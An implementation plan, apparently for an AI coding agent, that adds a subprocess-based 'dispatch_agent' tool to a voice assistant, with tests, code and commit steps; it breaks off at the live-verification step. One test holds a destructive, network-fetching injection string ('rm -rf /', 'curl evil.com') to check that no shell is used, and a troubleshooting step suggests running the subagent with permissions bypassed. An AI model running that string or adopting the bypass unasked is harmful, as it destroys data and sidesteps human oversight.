# Voice-agent subagent dispatch via CLI subprocess — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship the `dispatch_agent` tool described in `docs/superpowers/specs/2026-05-27-voice-agent-subagent-dispatch.md` so voice JARVIS can spawn `bin/jarvis` as a subprocess to handle Explore / researcher / code_reviewer / Plan sub-tasks with isolated context.

**Architecture:** One new tool module (`src/voice-agent/tools/dispatch_agent.py`) that spawns `bin/jarvis --print "<prompt>"` via `asyncio.create_subprocess_exec` (argv list, no shell). The subagent type is encoded INTO the prompt text ("Use the Explore agent to: …") rather than via a CLI flag, because `bin/jarvis` exposes `-p/--print` but no `--subagent` (verified at `src/cli/src/main.tsx:5781`). Front-loaded ack phrases set expectations during the sync wait. Per-type timeouts cap the dead-air worst case. Telemetry adds 3 columns to `turns`.

**Tech Stack:** Python 3.13, livekit-agents (vendored in `src/voice-agent/.venv`), pytest 9.0.3 (already installed from earlier session), SQLite (telemetry), `asyncio.create_subprocess_exec` (subprocess plumbing).

**Spec:** `docs/superpowers/specs/2026-05-27-voice-agent-subagent-dispatch.md` (committed `f830a385`)

---

## File Map

| File | Role | Action |
|---|---|---|
| `src/voice-agent/tools/dispatch_agent.py` | NEW — schema, handler, registry.register call, per-type policy table | Task 2 |
| `src/voice-agent/pipeline/turn_telemetry.py` | ADD 3 ALTER TABLE entries + log_turn writer args | Task 1 |
| `src/voice-agent/jarvis_agent.py` | Wire `_jarvis_subagent_*` session attrs + log_turn binding | Task 3 |
| `src/voice-agent/prompts/supervisor.md` | ADD subagent-dispatch routing paragraph | Task 4 |
| `src/voice-agent/tests/test_dispatch_agent.py` | NEW — unit (mocked subprocess) | Task 2 |
| `src/voice-agent/tests/test_dispatch_agent_integration.py` | NEW — real bin/jarvis subprocess smoke | Task 5 |

Tools auto-discover via `tools/_adapter.py::load_all_livekit_tools` globbing `tools/*.py` — no edit needed there.

---

## Task 0: Verify pytest + CLI print mode is reachable

**Background:** Pytest was installed earlier in this session at `~/Documents/Projects/jarvis/src/voice-agent/.venv/`. Confirm it's still functional and confirm `bin/jarvis --help` runs without crashing (we don't actually invoke `--print` against the LLM here — too costly; that lands in Task 5 integration).

**Files:** none modified.

- [ ] **Step 0.1: Pytest sanity**

Run:
```bash
cd /home/ulrich/Documents/Projects/jarvis/src/voice-agent && .venv/bin/python -m pytest --version
```
Expected: `pytest 9.0.3` or newer.

- [ ] **Step 0.2: bin/jarvis --help shape**

Run:
```bash
timeout 30 bash /home/ulrich/Documents/Projects/jarvis/bin/jarvis --help 2>&1 | head -50
```
Expected: output mentions `-p, --print [prompt]` (the headless mode flag we'll use). Note whether it ALSO mentions any agent-type / subagent flag. If the CLI does turn out to have a `--subagent <type>` flag we missed, that simplifies dispatch — note it and proceed; Task 2's policy table can still drop the prompt-prefix and use the CLI flag instead.

- [ ] **Step 0.3: No commit.** Proceed to Task 1.

---

## Task 1: Add 3 telemetry columns

**Files:**
- Modify: `src/voice-agent/pipeline/turn_telemetry.py` (init_db ALTER TABLE block + log_turn signature)
- Test: `src/voice-agent/tests/test_turn_telemetry.py`

- [ ] **Step 1.1: Locate the existing CONFAB_STATE ALTER TABLE block**

Run:
```bash
grep -nE "ALTER TABLE turns ADD COLUMN" /home/ulrich/Documents/Projects/jarvis/src/voice-agent/pipeline/turn_telemetry.py | head -20
```
Note the line range — the new ALTERs append after the last existing one. The pattern uses a try/except around `cur.execute("ALTER TABLE turns ADD COLUMN ... ")` with `except sqlite3.OperationalError: pass` for idempotency.

- [ ] **Step 1.2: Write the failing test**

Add to `src/voice-agent/tests/test_turn_telemetry.py`:

```python
def test_subagent_columns_exist_after_init():
    """init_db must add the 3 subagent columns idempotently."""
    import sqlite3, tempfile, os
    from pipeline.turn_telemetry import init_db
    with tempfile.TemporaryDirectory() as td:
        db = os.path.join(td, "t.db")
        init_db(db)
        # idempotent — second call must not raise
        init_db(db)
        conn = sqlite3.connect(db)
        cols = {r[1] for r in conn.execute("PRAGMA table_info(turns)").fetchall()}
        conn.close()
    assert {"subagent_type", "subagent_ms", "subagent_status"}.issubset(cols), (
        f"missing subagent_* columns in turns; have: {sorted(cols)}"
    )


def test_log_turn_writes_subagent_fields():
    """log_turn must accept the 3 new kwargs and persist them."""
    import sqlite3, tempfile, os
    from pipeline.turn_telemetry import init_db, log_turn
    with tempfile.TemporaryDirectory() as td:
        db = os.path.join(td, "t.db")
        init_db(db)
        log_turn(
            db_path=db,
            user_text="find computer_use",
            jarvis_text="It's at tools/computer_use.py:75",
            route="TASK_OTHER",
            llm_used="anthropic:claude-sonnet-4-6",
            voice_used="troy",
            subagent_type="explore",
            subagent_ms=4321,
            subagent_status="success",
        )
        conn = sqlite3.connect(db)
        row = conn.execute(
            "SELECT subagent_type, subagent_ms, subagent_status FROM turns ORDER BY id DESC LIMIT 1"
        ).fetchone()
        conn.close()
    assert row == ("explore", 4321, "success"), f"got {row!r}"
```

- [ ] **Step 1.3: Run the failing tests**

Run:
```bash
cd /home/ulrich/Documents/Projects/jarvis/src/voice-agent && .venv/bin/python -m pytest tests/test_turn_telemetry.py::test_subagent_columns_exist_after_init tests/test_turn_telemetry.py::test_log_turn_writes_subagent_fields -v
```
Expected: BOTH FAIL — column missing / unknown kwarg.

- [ ] **Step 1.4: Add the three ALTER TABLE entries**

Find the existing `try: cur.execute("ALTER TABLE turns ADD COLUMN <last_existing> ...")` block in `init_db()`. Right after the last existing column-add, append:

```python
    try:
        cur.execute("ALTER TABLE turns ADD COLUMN subagent_type TEXT")
    except sqlite3.OperationalError:
        pass  # column already exists
    try:
        cur.execute("ALTER TABLE turns ADD COLUMN subagent_ms INTEGER")
    except sqlite3.OperationalError:
        pass
    try:
        cur.execute("ALTER TABLE turns ADD COLUMN subagent_status TEXT")
    except sqlite3.OperationalError:
        pass
```

(Match the existing surrounding indentation. The pattern is the same as the prior `confab_check_state` / `confab_pattern_matched` adds.)

- [ ] **Step 1.5: Update log_turn to accept + persist the new fields**

Find `def log_turn(` in the same file. Add three new keyword-only parameters to the signature (defaulting to None):

```python
        subagent_type: str | None = None,
        subagent_ms: int | None = None,
        subagent_status: str | None = None,
```

Find the existing INSERT statement inside log_turn (a `cur.execute("INSERT INTO turns (...)" or similar). Add `subagent_type`, `subagent_ms`, `subagent_status` to the column list and `?, ?, ?` to the VALUES placeholders, and pass them through the params tuple. Match the column order from your INSERT exactly.

(If the INSERT uses a dict-of-columns style instead of positional placeholders, add three keys to that dict.)

- [ ] **Step 1.6: Run tests to verify they pass**

Run the same command from Step 1.3.
Expected: BOTH PASS.

- [ ] **Step 1.7: Run the full turn_telemetry test file to catch regressions**

Run:
```bash
cd /home/ulrich/Documents/Projects/jarvis/src/voice-agent && .venv/bin/python -m pytest tests/test_turn_telemetry.py -v
```
Expected: every test PASS. If any pre-existing test broke (e.g., one that introspects column count), update it to expect the new total.

- [ ] **Step 1.8: Commit**

```bash
cd /home/ulrich/Documents/Projects/jarvis
git add src/voice-agent/pipeline/turn_telemetry.py src/voice-agent/tests/test_turn_telemetry.py
git commit -m "feat(voice-agent): add 3 subagent_* telemetry columns to turn_telemetry.turns"
```

---

## Task 2: Implement `dispatch_agent` tool module + unit tests

**Files:**
- Create: `src/voice-agent/tools/dispatch_agent.py`
- Create: `src/voice-agent/tests/test_dispatch_agent.py`

- [ ] **Step 2.1: Write the failing tests FIRST**

Create `src/voice-agent/tests/test_dispatch_agent.py`:

```python
"""Unit tests for dispatch_agent tool — mocked subprocess, no real bin/jarvis run."""
from __future__ import annotations

import asyncio
import json
import os
import sys
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# Tests run from the voice-agent root.
sys.path.insert(0, str(Path(__file__).parent.parent))

# Required envs for module imports (registry depends on them).
os.environ.setdefault("GROQ_API_KEY", "test-key-for-init")
os.environ.setdefault("ANTHROPIC_API_KEY", "test-anthropic-key")


def _make_fake_proc(stdout: bytes = b"", stderr: bytes = b"", returncode: int = 0):
    """Build a fake asyncio subprocess that returns given output."""
    proc = MagicMock()
    proc.returncode = returncode
    proc.communicate = AsyncMock(return_value=(stdout, stderr))
    proc.kill = MagicMock()
    proc.wait = AsyncMock(return_value=returncode)
    return proc


@pytest.mark.asyncio
async def test_explore_success_returns_subprocess_stdout(monkeypatch):
    from tools.dispatch_agent import handle_dispatch_agent
    fake_proc = _make_fake_proc(stdout=b"Found at tools/computer_use.py:75\n", returncode=0)
    monkeypatch.setattr(
        "asyncio.create_subprocess_exec",
        AsyncMock(return_value=fake_proc),
    )
    result = await handle_dispatch_agent(
        {"subagent_type": "explore", "task": "find where computer_use is defined",
         "description": "find computer_use def"}
    )
    assert "Found at tools/computer_use.py:75" in result


@pytest.mark.asyncio
async def test_unknown_subagent_type_rejected_before_subprocess(monkeypatch):
    """Schema-level validation rejects bad type without ever spawning."""
    from tools.dispatch_agent import handle_dispatch_agent
    spawn_mock = AsyncMock()
    monkeypatch.setattr("asyncio.create_subprocess_exec", spawn_mock)
    result = await handle_dispatch_agent(
        {"subagent_type": "nonsense", "task": "x", "description": "x"}
    )
    parsed = json.loads(result) if result.startswith("{") else {"error": "unparsed"}
    assert "error" in parsed
    assert "unknown subagent_type" in parsed["error"] or "nonsense" in parsed["error"]
    spawn_mock.assert_not_called()


@pytest.mark.asyncio
async def test_timeout_kills_subprocess(monkeypatch):
    """When the subprocess hangs past timeout, dispatcher SIGKILLs it and returns a timeout error."""
    from tools.dispatch_agent import handle_dispatch_agent

    fake_proc = MagicMock()
    fake_proc.returncode = None
    async def slow_communicate():
        await asyncio.sleep(10)  # longer than the test's wait_for
        return b"", b""
    fake_proc.communicate = AsyncMock(side_effect=slow_communicate)
    fake_proc.kill = MagicMock()
    fake_proc.wait = AsyncMock(return_value=-9)

    monkeypatch.setattr(
        "asyncio.create_subprocess_exec",
        AsyncMock(return_value=fake_proc),
    )
    # Force explore's timeout to 0.05s for the test (env override knob added in Task 2.3).
    monkeypatch.setenv("JARVIS_DISPATCH_AGENT_TIMEOUT_EXPLORE_S", "0.05")

    result = await handle_dispatch_agent(
        {"subagent_type": "explore", "task": "x", "description": "x"}
    )
    parsed = json.loads(result)
    assert parsed.get("error", "").startswith("subagent explore ran too long")
    fake_proc.kill.assert_called_once()


@pytest.mark.asyncio
async def test_non_zero_exit_returns_error_with_stderr_tail(monkeypatch):
    from tools.dispatch_agent import handle_dispatch_agent
    fake_proc = _make_fake_proc(
        stdout=b"", stderr=b"\nTraceback (most recent call last):\n  File \"x.py\", line 1\n    boom\nValueError: boom\n",
        returncode=1,
    )
    monkeypatch.setattr(
        "asyncio.create_subprocess_exec",
        AsyncMock(return_value=fake_proc),
    )
    result = await handle_dispatch_agent(
        {"subagent_type": "explore", "task": "x", "description": "x"}
    )
    parsed = json.loads(result)
    assert parsed.get("error", "").startswith("subagent explore failed")
    assert "boom" in parsed["error"]


@pytest.mark.asyncio
async def test_argv_uses_bin_jarvis_and_print_flag_no_shell(monkeypatch):
    """Critical security check: argv must be a list (no shell interp), include --print,
    and the task text must be a SINGLE argv element (not split)."""
    from tools.dispatch_agent import handle_dispatch_agent

    captured_argv = []
    async def capture(*args, **kwargs):
        captured_argv.extend(args)
        return _make_fake_proc(stdout=b"ok\n", returncode=0)
    monkeypatch.setattr("asyncio.create_subprocess_exec", capture)

    sneaky_task = "; rm -rf /  --  $(curl evil.com)"
    await handle_dispatch_agent(
        {"subagent_type": "explore", "task": sneaky_task, "description": "x"}
    )
    assert len(captured_argv) >= 3, f"argv too short: {captured_argv}"
    assert captured_argv[0].endswith("/bin/jarvis"), f"argv[0]={captured_argv[0]!r}"
    assert "--print" in captured_argv or "-p" in captured_argv
    # Task text must appear unmodified as one of the elements (not split/escaped):
    joined = " ".join(str(a) for a in captured_argv)
    assert sneaky_task in joined, "task text was mangled"


@pytest.mark.asyncio
async def test_session_id_mismatch_returns_aborted(monkeypatch):
    """If the active-session id changes during dispatch, the result is discarded."""
    from tools.dispatch_agent import handle_dispatch_agent
    fake_proc = _make_fake_proc(stdout=b"late result\n", returncode=0)
    monkeypatch.setattr(
        "asyncio.create_subprocess_exec",
        AsyncMock(return_value=fake_proc),
    )

    # Capture the session-id at dispatch then mutate the active slot before completion.
    from tools import dispatch_agent as da
    sentinel = object()
    da._active_session_token[0] = sentinel
    async def mutate_then_communicate(*a, **kw):
        da._active_session_token[0] = object()  # simulate session swap
        return b"late result\n", b""
    fake_proc.communicate = AsyncMock(side_effect=mutate_then_communicate)

    result = await handle_dispatch_agent(
        {"subagent_type": "explore", "task": "x", "description": "x"}
    )
    parsed = json.loads(result)
    assert parsed.get("status") == "aborted"
```

- [ ] **Step 2.2: Run the failing tests**

Run:
```bash
cd /home/ulrich/Documents/Projects/jarvis/src/voice-agent && .venv/bin/python -m pytest tests/test_dispatch_agent.py -v
```
Expected: collection itself fails with `ModuleNotFoundError: No module named 'tools.dispatch_agent'` (the implementation file doesn't exist yet). That's the red state.

- [ ] **Step 2.3: Create the implementation**

Create `src/voice-agent/tools/dispatch_agent.py` with this exact content:

```python
"""``dispatch_agent`` tool — spawn a CC-style named agent via the bin/jarvis CLI.

Spec: docs/superpowers/specs/2026-05-27-voice-agent-subagent-dispatch.md
Plan: docs/superpowers/plans/2026-05-27-voice-agent-subagent-dispatch.md

Single registered tool ``dispatch_agent`` that runs ``bin/jarvis --print "<prompt>"``
as a subprocess to handle one of four named CLI agent types: Explore, researcher,
code-reviewer, Plan. Synchronous wait with per-type timeout; a front-loaded ack
phrase plays via the existing _front_loaded_ack pipeline so the user isn't
stranded in silence during the wait.

The CLI lacks a ``--subagent`` flag, so the agent type is encoded into the
prompt prefix (``"Use the Explore agent to: <task>"``); the CLI supervisor's
own AgentTool routing picks up the intent and dispatches the right named agent.

Environment overrides (operator tuning):
  JARVIS_DISPATCH_AGENT_TIMEOUT_EXPLORE_S       (default 30)
  JARVIS_DISPATCH_AGENT_TIMEOUT_RESEARCHER_S    (default 90)
  JARVIS_DISPATCH_AGENT_TIMEOUT_CODE_REVIEWER_S (default 60)
  JARVIS_DISPATCH_AGENT_TIMEOUT_PLAN_S          (default 60)
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import time
from pathlib import Path
from typing import Any, Dict

from .registry import registry

logger = logging.getLogger("jarvis.dispatch_agent")

# bin/jarvis path is resolved relative to this file: tools/ -> voice-agent/ -> src/ -> project root -> bin/jarvis
_BIN_JARVIS = Path(__file__).resolve().parents[3] / "bin" / "jarvis"

# Per-type policy. Each entry: (cli_prompt_prefix, default_timeout_seconds, env_override_var, ack_phrase)
_POLICY: Dict[str, Dict[str, Any]] = {
    "explore": {
        "prompt_prefix": "Use the Explore agent to: ",
        "default_timeout_s": 30.0,
        "timeout_env": "JARVIS_DISPATCH_AGENT_TIMEOUT_EXPLORE_S",
        "ack": "Searching the code…",
    },
    "researcher": {
        "prompt_prefix": "Use the researcher agent to: ",
        "default_timeout_s": 90.0,
        "timeout_env": "JARVIS_DISPATCH_AGENT_TIMEOUT_RESEARCHER_S",
        "ack": "Looking that up online…",
    },
    "code_reviewer": {
        "prompt_prefix": "Use the code-reviewer agent to: ",
        "default_timeout_s": 60.0,
        "timeout_env": "JARVIS_DISPATCH_AGENT_TIMEOUT_CODE_REVIEWER_S",
        "ack": "Reviewing the diff…",
    },
    "plan": {
        "prompt_prefix": "Use the Plan agent to: ",
        "default_timeout_s": 60.0,
        "timeout_env": "JARVIS_DISPATCH_AGENT_TIMEOUT_PLAN_S",
        "ack": "Thinking through that design…",
    },
}

# Single-slot session-id tracker. The agent updates this on every turn; the
# dispatcher snapshots it at dispatch time and compares on completion. A swap
# means the user's turn has been abandoned (barge-in / new conversation) and
# the in-flight subagent result should be discarded.
_active_session_token: list = [None]


def _timeout_for(subagent_type: str) -> float:
    pol = _POLICY[subagent_type]
    override = os.environ.get(pol["timeout_env"], "").strip()
    if override:
        try:
            return float(override)
        except ValueError:
            logger.warning(
                f"[dispatch_agent] bad env {pol['timeout_env']}={override!r}; "
                f"using default {pol['default_timeout_s']}s"
            )
    return float(pol["default_timeout_s"])


def _build_argv(subagent_type: str, task: str) -> list[str]:
    prompt = _POLICY[subagent_type]["prompt_prefix"] + task
    return [str(_BIN_JARVIS), "--print", prompt]


async def handle_dispatch_agent(args: Dict[str, Any]) -> str:
    """Tool handler. Returns either the subagent's stdout (success) or a JSON
    error object (timeout / non-zero exit / spawn-failure / aborted).

    Front-loaded ack is fired separately by the voice-agent (jarvis_agent.py
    reads the ack phrase off this module via per-type policy lookup); the
    handler itself only owns subprocess lifecycle + timeout + telemetry.
    """
    subagent_type = (args.get("subagent_type") or "").strip()
    task = (args.get("task") or "").strip()
    description = (args.get("description") or "").strip()

    if subagent_type not in _POLICY:
        return json.dumps({
            "error": f"unknown subagent_type {subagent_type!r}; expected one of {list(_POLICY)}"
        })
    if not task:
        return json.dumps({"error": "task is required and must be non-empty"})

    # Snapshot the active session token at dispatch time. If it changes by the
    # time the subprocess finishes, the turn was abandoned and we discard.
    dispatch_token = _active_session_token[0]

    argv = _build_argv(subagent_type, task)
    timeout_s = _timeout_for(subagent_type)
    started = time.monotonic()

    logger.info(
        f"[dispatch_agent] spawn type={subagent_type} timeout={timeout_s}s "
        f"description={description!r} task_chars={len(task)}"
    )

    try:
        proc = await asyncio.create_subprocess_exec(
            *argv,
            stdin=asyncio.subprocess.DEVNULL,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
    except (FileNotFoundError, PermissionError) as e:
        return json.dumps({
            "error": f"could not start bin/jarvis: {type(e).__name__}: {e}"
        })

    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout_s)
    except asyncio.TimeoutError:
        try:
            proc.kill()
            await proc.wait()
        except Exception:
            pass
        elapsed_ms = int((time.monotonic() - started) * 1000)
        logger.warning(
            f"[dispatch_agent] timeout type={subagent_type} after {elapsed_ms}ms"
        )
        return json.dumps({
            "error": f"subagent {subagent_type} ran too long (>{int(timeout_s)}s); aborted"
        })

    elapsed_ms = int((time.monotonic() - started) * 1000)

    # Session-id drift check: if the active token changed during the run,
    # the user's turn is abandoned. Don't return the stale result.
    if _active_session_token[0] is not dispatch_token and dispatch_token is not None:
        logger.info(
            f"[dispatch_agent] session swap during dispatch — discarding type={subagent_type} ms={elapsed_ms}"
        )
        return json.dumps({"status": "aborted", "reason": "session swap during dispatch"})

    if proc.returncode != 0:
        tail = (stderr.decode("utf-8", errors="replace") or "").strip()[-200:]
        logger.warning(
            f"[dispatch_agent] non-zero exit type={subagent_type} rc={proc.returncode} ms={elapsed_ms}"
        )
        return json.dumps({
            "error": f"subagent {subagent_type} failed (exit {proc.returncode}): {tail}"
        })

    text = stdout.decode("utf-8", errors="replace").strip()
    logger.info(
        f"[dispatch_agent] success type={subagent_type} ms={elapsed_ms} stdout_chars={len(text)}"
    )
    return text


def get_ack_phrase(subagent_type: str) -> str | None:
    """Return the canned ack phrase for a subagent type, or None for unknown."""
    pol = _POLICY.get(subagent_type)
    return pol["ack"] if pol else None


SCHEMA: Dict[str, Any] = {
    "name": "dispatch_agent",
    "description": (
        "Spawn a fresh CLI agent to handle a sub-task with isolated context. "
        "Use when the supervisor's own tool surface would drown in raw output "
        "or when a specialized agent does it better.\n\n"
        "subagent_type:\n"
        "  - 'explore'        : fast file/code search (1-5s). Returns synthesis, not raw grep.\n"
        "  - 'researcher'     : deep web research (15-60s). Returns synthesized answer + sources.\n"
        "  - 'code_reviewer'  : review uncommitted diff against project rules (10-30s).\n"
        "  - 'plan'           : design how to implement a feature (10-30s).\n\n"
        "DO NOT use for simple lookups the supervisor can handle directly. "
        "DO NOT reply 'I'll look into that' WITHOUT actually calling this tool — "
        "claiming dispatch without dispatching is confab."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "subagent_type": {
                "type": "string",
                "enum": ["explore", "researcher", "code_reviewer", "plan"],
            },
            "task":        {"type": "string", "description": "What the subagent should do, in 1-3 sentences"},
            "description": {"type": "string", "description": "Short 3-5 word label for telemetry"},
        },
        "required": ["subagent_type", "task", "description"],
    },
}


registry.register(
    name="dispatch_agent",
    schema=SCHEMA,
    handler=handle_dispatch_agent,
)
```

(If `registry.register` in this codebase takes different kwargs — e.g., `check_fn`, `requires_env` — look at a neighbor tool like `tools/web_tools.py` or `tools/computer_use.py` and match the existing pattern. Don't invent kwargs.)

- [ ] **Step 2.4: Run the tests to verify they pass**

Run the same command from Step 2.2.
Expected: 6/6 PASS. If `_active_session_token` test fails due to a missing module-level slot, ensure the `_active_session_token = [None]` line was actually written.

- [ ] **Step 2.5: Run the full voice-agent suite to catch regressions**

Run:
```bash
cd /home/ulrich/Documents/Projects/jarvis/src/voice-agent && .venv/bin/python -m pytest tests/ -q --tb=line --ignore=tests/test_memory_injection_no_bump.py 2>&1 | tail -5
```
Expected: 2604+ passed, 0 failed (the pre-existing collection error in `test_memory_injection_no_bump.py` is excluded).

- [ ] **Step 2.6: Commit**

```bash
cd /home/ulrich/Documents/Projects/jarvis
git add src/voice-agent/tools/dispatch_agent.py src/voice-agent/tests/test_dispatch_agent.py
git commit -m "feat(voice-agent): dispatch_agent tool — CC-style subagent spawning via bin/jarvis subprocess"
```

---

## Task 3: Wire session-id tracking + telemetry hook-up in `jarvis_agent.py`

**Files:**
- Modify: `src/voice-agent/jarvis_agent.py` (turn-start handler + log_turn call)

**Background:** The dispatcher's `_active_session_token` lets it detect mid-dispatch turn abandonment. The agent must update it on every turn start. Telemetry: when a turn's tool_calls include `dispatch_agent`, the agent must capture the subagent_type / subagent_ms / subagent_status and pass them to log_turn.

- [ ] **Step 3.1: Locate the turn-start handler that already resets `_jarvis_tool_calls_this_turn`**

Run:
```bash
grep -nE "_jarvis_tool_calls_this_turn = \[\]" /home/ulrich/Documents/Projects/jarvis/src/voice-agent/jarvis_agent.py
```
Per the 2026-05-27 confab-gate Task 5 audit, this lives in `_on_user_input` around line 4842 inside the `is_final=True` branch. The session-id reset for dispatch_agent goes there too.

- [ ] **Step 3.2: Update the turn-start handler — bump session token + reset subagent stash**

In `_on_user_input` (around line 4828-4847), immediately after the existing `session._jarvis_tool_calls_this_turn = []` line in the `is_final` branch, append:

```python
                # Bump the dispatch_agent session-id slot so any in-flight
                # subagent from a prior turn discards its stale result on
                # completion. New per-turn defaults for telemetry too.
                try:
                    from tools import dispatch_agent as _da
                    _da._active_session_token[0] = object()
                except Exception:
                    pass
                session._jarvis_subagent_type = None
                session._jarvis_subagent_ms = None
                session._jarvis_subagent_status = None
```

- [ ] **Step 3.3: Capture subagent telemetry when dispatch_agent fires (post-tool-call observer)**

Locate `_on_function_tools_executed` (search for the existing `_on_function_tools_executed` handler — per the same Task 5 audit it lives around line 4855-4864). Inside its body, BEFORE the existing list-extend, add:

```python
        # If dispatch_agent fired this turn, stash its outcome on the session
        # so log_turn can persist subagent_type / subagent_ms / subagent_status.
        for call in calls:
            if getattr(call, "name", "") == "dispatch_agent" or (
                isinstance(call, dict) and call.get("name") == "dispatch_agent"
            ):
                args = getattr(call, "arguments", None) or (
                    call.get("arguments") if isinstance(call, dict) else None
                )
                # arguments may be a JSON string or a dict; handle both.
                if isinstance(args, str):
                    try:
                        import json as _json
                        args = _json.loads(args)
                    except Exception:
                        args = {}
                if isinstance(args, dict):
                    session._jarvis_subagent_type = args.get("subagent_type")
                # Result + duration are extracted later from the tool_result;
                # the handler returns a JSON error or raw stdout — parsing it
                # for ms is unreliable. Approximate via timestamps if needed.
                # For Phase-1 telemetry we capture type + status only.
                result = getattr(call, "output", None) or (
                    call.get("output") if isinstance(call, dict) else None
                )
                if isinstance(result, str):
                    if result.startswith("{") and '"error"' in result:
                        session._jarvis_subagent_status = "error"
                    elif result.startswith("{") and '"status": "aborted"' in result:
                        session._jarvis_subagent_status = "aborted"
                    else:
                        session._jarvis_subagent_status = "success"
```

(The exact shape of `calls` items in `_on_function_tools_executed` depends on the livekit-agents version — the handler already iterates them. Match whatever pattern the existing code uses for reading tool-call names + arguments. If a sibling handler in the same file shows `.name` and `.arguments` attribute access, follow that; if it shows dict access, follow that.)

- [ ] **Step 3.4: Pass the new fields to log_turn**

Find the `log_turn(...)` call site in jarvis_agent.py (search for `log_turn(`). Add the three new kwargs:

```python
        subagent_type=getattr(session, "_jarvis_subagent_type", None),
        subagent_ms=getattr(session, "_jarvis_subagent_ms", None),
        subagent_status=getattr(session, "_jarvis_subagent_status", None),
```

(Place them alongside the existing confab-state kwargs that landed earlier this PR.)

- [ ] **Step 3.5: Smoke-test the import**

Run:
```bash
cd /home/ulrich/Documents/Projects/jarvis/src/voice-agent && .venv/bin/python -c "import jarvis_agent; print('OK')" 2>&1 | tail -3
```
Expected: ends with `OK`. If `ImportError` raises for `tools.dispatch_agent`, the registry's auto-discovery may not have re-imported — try again with a fresh interpreter (subprocess startup is cold).

- [ ] **Step 3.6: Run the confab-gate + dispatcher test files (high regression risk surface)**

Run:
```bash
cd /home/ulrich/Documents/Projects/jarvis/src/voice-agent && .venv/bin/python -m pytest tests/test_pre_tts_confab_gate.py tests/test_dispatcher_specialty_routes.py tests/test_dispatch_agent.py tests/test_turn_telemetry.py -q --tb=short
```
Expected: all PASS.

- [ ] **Step 3.7: Commit**

```bash
cd /home/ulrich/Documents/Projects/jarvis
git add src/voice-agent/jarvis_agent.py
git commit -m "feat(voice-agent): wire dispatch_agent session-id tracking + telemetry hook"
```

---

## Task 4: Supervisor system-prompt routing paragraph

**Files:**
- Modify: `src/voice-agent/prompts/supervisor.md`

- [ ] **Step 4.1: Find an appropriate insertion point**

Run:
```bash
grep -nE "^##|^# " /home/ulrich/Documents/Projects/jarvis/src/voice-agent/prompts/supervisor.md | head -20
```
Look for a section about tool routing or tool selection. The new paragraph goes immediately after that section. If no such section exists, append it at the end.

- [ ] **Step 4.2: Append the routing paragraph**

Add this block (verbatim) at the insertion point:

```markdown
## SUBAGENT DISPATCH — dispatch_agent

Use `dispatch_agent(subagent_type=..., task=..., description=...)` when:
- User asks "find / search / where is" anything in the codebase → `subagent_type='explore'`
- User asks "look up / research / what's the latest on" anything online → `subagent_type='researcher'`
- User asks "review my diff / check my changes" → `subagent_type='code_reviewer'`
- User asks "how should I implement / design / approach" anything → `subagent_type='plan'`

Do NOT use `dispatch_agent` for simple lookups you can handle directly with `read_file` / `web_search` / `code_search`.
Do NOT chain multiple `dispatch_agent` calls in one turn — each spawns a slow subprocess.
The ack ("Searching the code…", etc.) plays automatically when this tool fires; do not narrate it yourself.
```

- [ ] **Step 4.3: No code tests — system-prompt changes are validated live in Task 6. Commit.**

```bash
cd /home/ulrich/Documents/Projects/jarvis
git add src/voice-agent/prompts/supervisor.md
git commit -m "feat(voice-agent): supervisor.md adds dispatch_agent routing paragraph"
```

---

## Task 5: Integration test (real `bin/jarvis` subprocess)

**Files:**
- Create: `src/voice-agent/tests/test_dispatch_agent_integration.py`

**Background:** Unit tests mocked the subprocess. The integration test actually spawns `bin/jarvis` with `--print` and verifies the subprocess plumbing end-to-end (argv shape, stdout capture, env inheritance, timeout enforcement). It costs real API tokens — gate behind a skip marker so CI / no-key environments don't hit it.

- [ ] **Step 5.1: Write the integration test**

Create `src/voice-agent/tests/test_dispatch_agent_integration.py`:

```python
"""Integration tests for dispatch_agent — spawns real bin/jarvis.

Skipped when ANTHROPIC_API_KEY is missing (no LLM ↔ no useful subagent run).
Skipped when bin/jarvis doesn't exist (e.g., fresh checkout pre-setup).

Each test that actually invokes bin/jarvis costs real API tokens. Keep the
prompts tiny.
"""
from __future__ import annotations

import asyncio
import os
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

_BIN_JARVIS = Path(__file__).resolve().parents[3] / "bin" / "jarvis"
_HAS_KEY = bool(os.environ.get("ANTHROPIC_API_KEY", "").strip())


@pytest.mark.skipif(not _BIN_JARVIS.exists(), reason="bin/jarvis missing")
@pytest.mark.skipif(not _HAS_KEY, reason="ANTHROPIC_API_KEY unset")
@pytest.mark.asyncio
async def test_real_dispatch_explore_finds_file_path():
    """End-to-end Explore dispatch — should return a string mentioning the file."""
    from tools.dispatch_agent import handle_dispatch_agent

    # 30s timeout default for explore; this prompt should easily fit.
    result = await handle_dispatch_agent({
        "subagent_type": "explore",
        "task": (
            "find the path of the file that defines the dispatch_agent tool. "
            "Reply with only the path, nothing else."
        ),
        "description": "find dispatch_agent file",
    })

    # The result is either the subagent's stdout or a JSON error object.
    # On success, the answer must mention 'dispatch_agent.py' somewhere.
    assert "dispatch_agent.py" in result, (
        f"expected the subagent to find dispatch_agent.py; got: {result!r}"
    )
```

- [ ] **Step 5.2: Run the integration test**

Run:
```bash
cd /home/ulrich/Documents/Projects/jarvis/src/voice-agent && .venv/bin/python -m pytest tests/test_dispatch_agent_integration.py -v -s
```
Expected: PASS (or SKIPPED if running on a machine without the key / without bin/jarvis). The `-s` flag streams the subagent's progress in case it's slow.

If the test FAILS with timeout or non-zero exit, inspect the subagent's stderr — likely `bin/jarvis --print` requires something we didn't pass (e.g., a permission-mode flag). Check `src/cli/scripts/start.sh:182-184` for the canonical interactive invocation; the print path may need similar flags. Fix is small — adjust `_build_argv` in `tools/dispatch_agent.py` to pass any missing flag (e.g., `--permission-mode bypassPermissions`), update Task 2's argv test, re-run.

- [ ] **Step 5.3: Commit**

```bash
cd /home/ulrich/Documents/Projects/jarvis
git add src/voice-agent/tests/test_dispatch_agent_integration.py
git commit -m "test(voice-agent): integration test for dispatch_agent real-subprocess path"
```

---

## Task 6: Live verification — restart agent and trigger a real dispatch

**Files:** none changed (verification only).

- [ ] **Step 6.1: Confirm no active session before restart**

Run:
